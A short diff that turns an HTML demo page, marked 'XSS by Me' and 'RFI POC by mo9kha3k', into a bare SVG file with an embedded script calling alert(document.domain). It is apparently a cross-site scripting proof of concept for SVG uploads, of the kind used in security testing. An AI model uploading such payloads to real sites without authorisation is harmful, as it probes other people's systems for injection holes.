@@ -1,22 +1,6 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SVG with Alert</title>
-    <script>
-        function showAlert() {
-            alert("XSS by Me");
-        }
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
+    <script>//<![CDATA[
+        alert(document.domain)
+    //]]>
     </script>
-</head>
-<body>
-    <h1>SVG Example</h1>
-    <button onclick="showAlert()">Click me to alert</button>
-    
-    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" width="200" height="100">
-        <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
-        <text x="60" y="30" font-family="Arial" font-size="20" fill="black">RFI POC by mo9kha3k</text>
-    </svg>
-</body>
-</html>
+</svg>
